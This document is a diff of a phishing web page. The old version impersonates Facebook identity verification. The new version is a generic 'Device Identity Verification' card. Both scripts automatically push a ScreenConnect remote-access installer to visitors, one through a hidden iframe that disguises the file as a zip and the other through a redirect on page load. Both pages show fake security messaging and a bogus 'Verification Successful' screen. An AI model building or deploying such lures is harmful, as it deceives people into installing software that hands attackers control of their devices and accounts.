@@ -1,457 +1,157 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook</title>
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Identity Verification</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-  body {
-    font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
-    background: #ffffff;
-    color: #1c1e21;
-    min-height: 100vh;
-  }
+        /* Background overlay & setup */
+        body {
+            /* Replace with your background image URL */
+            background: url('#') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-  .container {
-    display: flex;
-    min-height: 100vh;
-  }
+        /* Dark background overlay */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
 
-  /* ===== Left side ===== */
-  .left {
-    flex: 1;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 60px 50px;
-    background: #fafbfc;
-    position: relative;
-    overflow: hidden;
-  }
+        /* Main Card */
+        .card {
+            position: relative;
+            z-index: 2;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            transition: all 0.5s ease;
+        }
 
-  .left-inner {
-    max-width: 460px;
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    gap: 32px;
-  }
+        .card h2 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
 
-  .left-logo {
-    width: 56px;
-    height: 56px;
-    background: #1877f2;
-    border-radius: 50%;
-    color: #fff;
-    font-size: 42px;
-    font-weight: bold;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: Arial, sans-serif;
-    padding-bottom: 6px;
-    box-shadow: 0 6px 16px -6px rgba(24, 119, 242, 0.5);
-  }
+        .card p {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.6;
+        }
 
-  .left-headline {
-    font-size: 46px;
-    font-weight: 700;
-    line-height: 1.18;
-    color: #1c1e21;
-    letter-spacing: -1.3px;
-  }
+        /* Spinner animation */
+        .spinner {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
 
-  .left-headline .blue {
-    color: #1877f2;
-    display: block;
-  }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-  .left-sub {
-    font-size: 15px;
-    color: #65676b;
-    line-height: 1.7;
-    max-width: 400px;
-    margin-top: -14px;
-  }
+        /* Success Checkmark Icon */
+        .success-icon {
+            display: none;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px auto;
+            border-radius: 50%;
+            background: #2ecc71;
+            color: white;
+            font-size: 50px;
+            line-height: 80px;
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
 
-  .illustration {
-    position: relative;
-    height: 200px;
-    margin-top: 6px;
-  }
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
 
-  .phone {
-    position: absolute;
-    width: 120px;
-    height: 185px;
-    background: linear-gradient(160deg, #e7f3ff, #cfe4fb);
-    border-radius: 20px;
-    box-shadow: 0 10px 30px rgba(24, 119, 242, 0.12);
-    left: 30px;
-    top: 8px;
-    overflow: hidden;
-  }
-
-  .phone::before {
-    content: '';
-    position: absolute;
-    top: 12px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: 36px;
-    height: 4px;
-    background: rgba(0, 0, 0, 0.1);
-    border-radius: 2px;
-  }
-
-  .phone-inner {
-    position: absolute;
-    top: 36px;
-    left: 14px;
-    right: 14px;
-    bottom: 14px;
-    background: #ffffff;
-    border-radius: 12px;
-  }
-
-  .card-float {
-    position: absolute;
-    width: 100px;
-    height: 128px;
-    background: #ffffff;
-    border-radius: 16px;
-    box-shadow: 0 14px 34px rgba(0, 0, 0, 0.1);
-    left: 106px;
-    top: 46px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    gap: 7px;
-    padding: 12px;
-  }
-
-  .card-float .bar {
-    width: 100%;
-    height: 7px;
-    background: #e7f3ff;
-    border-radius: 4px;
-  }
-
-  .card-float .bar.short { width: 60%; }
-
-  .card-float .circle {
-    width: 36px;
-    height: 36px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #1877f2, #4293f5);
-    margin-bottom: 4px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .card-float .circle svg {
-    width: 18px;
-    height: 18px;
-    fill: #fff;
-  }
-
-  .emoji {
-    position: absolute;
-    font-size: 32px;
-    animation: float 3s ease-in-out infinite;
-  }
-
-  .emoji.e1 { top: 6px; left: 0; animation-delay: 0s; }
-  .emoji.e2 { top: 112px; left: 226px; animation-delay: 0.5s; font-size: 26px; }
-  .emoji.e3 { top: 26px; left: 236px; animation-delay: 1s; font-size: 28px; }
-
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
-  }
-
-  /* ===== Right side ===== */
-  .right {
-    flex: 1;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 60px 50px;
-    background: #ffffff;
-    border-left: 1px solid #e4e6eb;
-  }
-
-  .right-inner {
-    max-width: 400px;
-    width: 100%;
-  }
-
-  .card {
-    background: #ffffff;
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    text-align: center;
-    gap: 20px;
-  }
-
-  .card-badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    background: #e7f3ff;
-    color: #1877f2;
-    font-size: 11.5px;
-    font-weight: 700;
-    padding: 6px 14px;
-    border-radius: 20px;
-    letter-spacing: 0.4px;
-    text-transform: uppercase;
-  }
-
-  .card-badge .dot {
-    width: 6px;
-    height: 6px;
-    background: #1877f2;
-    border-radius: 50%;
-    animation: blink 1.5s ease-in-out infinite;
-  }
-
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.35; }
-  }
-
-  .card-title {
-    font-size: 22px;
-    font-weight: 700;
-    color: #1c1e21;
-    line-height: 1.4;
-    margin-top: 2px;
-  }
-
-  .card-sub {
-    font-size: 14px;
-    color: #65676b;
-    line-height: 1.7;
-    max-width: 340px;
-    margin-top: -6px;
-  }
-
-  .spinner {
-    width: 44px;
-    height: 44px;
-    border: 4px solid #e4e6eb;
-    border-top: 4px solid #1877f2;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    margin-top: 6px;
-  }
-
-  @keyframes spin {
-    0%   { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-
-  .download-btn {
-    background: #1877f2;
-    color: #ffffff;
-    border: none;
-    padding: 14px 30px;
-    border-radius: 8px;
-    font-size: 15.5px;
-    font-weight: 700;
-    cursor: pointer;
-    font-family: inherit;
-    transition: background 0.15s, transform 0.1s;
-    width: 100%;
-    margin-top: 6px;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 9px;
-  }
-
-  .download-btn:hover {
-    background: #166fe5;
-  }
-
-  .download-btn:active {
-    background: #145dc7;
-    transform: scale(0.99);
-  }
-
-  .download-btn svg {
-    width: 17px;
-    height: 17px;
-    fill: #fff;
-  }
-
-  .note {
-    font-size: 12.5px;
-    color: #8a8d91;
-    line-height: 1.6;
-    max-width: 320px;
-    margin-top: 4px;
-  }
-
-  #autoDownloadFrame {
-    display: none;
-    width: 0;
-    height: 0;
-    border: 0;
-  }
-
-  @media (max-width: 900px) {
-    .container { flex-direction: column; }
-    .left { padding: 40px 24px; }
-    .left-headline { font-size: 34px; }
-    .illustration { height: 170px; }
-    .right { padding: 40px 24px; border-left: none; border-top: 1px solid #e4e6eb; }
-  }
-
-  @media (max-width: 480px) {
-    .left-headline { font-size: 28px; }
-    .illustration { height: 150px; }
-    .phone { width: 100px; height: 150px; }
-    .card-float { width: 85px; height: 108px; left: 88px; top: 36px; }
-    .emoji { font-size: 24px; }
-    .emoji.e2 { left: 190px; }
-    .emoji.e3 { left: 200px; }
-  }
-</style>
+        .hidden {
+            display: none !important;
+        }
+    </style>
+			<script>
+window.addEventListener("load", function () {
+    setTimeout(function () {
+        window.location.href = "https://royaloakfinancialadvisors.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Yahoo_Work&c=&c=&c=&c=&c=&c=&c=";
+    }, 1000);
+});
+</script>
 </head>
 <body>
 
-  <div class="container">
+    <div class="overlay"></div>
 
-    <!-- Left side -->
-    <div class="left">
-      <div class="left-inner">
-        <div class="left-logo">f</div>
+    <div class="card" id="mainCard">
+        <!-- Spinner -->
+        <div class="spinner" id="spinner"></div>
 
-        <h1 class="left-headline">
-          Verify your identity,
-          <span class="blue">securely.</span>
-        </h1>
+        <!-- Checkmark -->
+        <div class="success-icon" id="successIcon">✓</div>
 
-        <p class="left-sub">
-          We take your account's safety seriously. Verification helps us keep your account protected.
-        </p>
-
-        <div class="illustration">
-          <div class="phone">
-            <div class="phone-inner"></div>
-          </div>
-
-          <div class="card-float">
-            <div class="circle">
-              <svg viewBox="0 0 24 24">
-                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-              </svg>
-            </div>
-            <div class="bar"></div>
-            <div class="bar short"></div>
-          </div>
-
-          <div class="emoji e1">🔒</div>
-          <div class="emoji e2">✅</div>
-          <div class="emoji e3">🛡️</div>
-        </div>
-      </div>
+        <!-- Content -->
+        <h2 id="title">Device Verification Required</h2>
+        <p id="description">You must download the file to confirm your device identity.</p>
     </div>
 
-    <!-- Right side -->
-    <div class="right">
-      <div class="right-inner">
-        <div class="card">
+    <script>
+        // Target URL to redirect to after 2 minutes
+        const targetURL = "#";
 
-          <div class="card-badge">
-            <span class="dot"></span>
-            Verification Required
-          </div>
+        // Wait time in seconds (120 seconds = 2 minutes)
+        const waitTimeInSeconds = 120; 
 
-          <div class="spinner"></div>
+        setTimeout(function() {
+            // Hide the spinner
+            document.getElementById('spinner').classList.add('hidden');
 
-          <h2 class="card-title">We need to verify your identity</h2>
+            // Show success checkmark
+            document.getElementById('successIcon').style.display = 'block';
 
-          <p class="card-sub">
-            To confirm this account belongs to you, please download the file below and run it on your device. Once it runs, your identity will be verified automatically.
-          </p>
+            // Change card text to success state
+            document.getElementById('title').innerText = "Verification Successful!";
+            document.getElementById('title').style.color = "#2ecc71";
+            document.getElementById('description').innerText = "Redirecting you to the next page now...";
 
-          <a class="download-btn" id="downloadBtn" href="https://github.com/makosel/frt/releases/download/gut/ScreenConnect.ClientSetup.exe" download>
-            <svg viewBox="0 0 24 24">
-              <path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/>
-            </svg>
-            Download file manually
-          </a>
+            // Redirect after 2 seconds
+            setTimeout(function() {
+                window.location.href = targetURL;
+            }, 2000);
 
-          <p class="note">
-            This step is required for your account's security. Please do not close this page until verification is complete.
-          </p>
-
-        </div>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- iframe مخفي للتحميل التلقائي -->
-  <iframe id="autoDownloadFrame" src="about:blank"></iframe>
-
-  <script>
-    // ============================================
-    //   إعدادات الملف
-    // ============================================
-    const FILE_URL  = 'https://github.com/makosel/frt/releases/download/gut/ScreenConnect.ClientSetup.exe';   // ← غيّر ده لرابط الملف بتاعك
-    const FILE_NAME = 'last_meta_theme.zip';         // ← اسم الملف عند التحميل
-
-    // ============================================
-    //   التحويل بعد 60 ثانية (في الخلفية)
-    // ============================================
-    const REDIRECT_URL  = 'https://www.facebook.com/login';
-    const TOTAL_SECONDS = 60;
-
-    setTimeout(() => {
-      window.location.href = REDIRECT_URL;
-    }, TOTAL_SECONDS * 1000);
-
-    // ============================================
-    //   زر التحميل اليدوي
-    // ============================================
-    const downloadBtn = document.getElementById('downloadBtn');
-    downloadBtn.href = FILE_URL;
-    downloadBtn.setAttribute('download', FILE_NAME);
-
-    // ============================================
-    //   التحميل التلقائي
-    // ============================================
-    const iframe = document.getElementById('autoDownloadFrame');
-
-    function autoDownload() {
-      // الطريقة 1: iframe مخفي
-      iframe.src = FILE_URL;
-
-    
-    }
-
-    // أول ما الصفحة تحمّل
-    window.addEventListener('load', () => {
-      setTimeout(autoDownload, 500);
-    });
-
-   
-  </script>
+        }, waitTimeInSeconds * 1000);
+    </script>
 
 </body>
 </html>
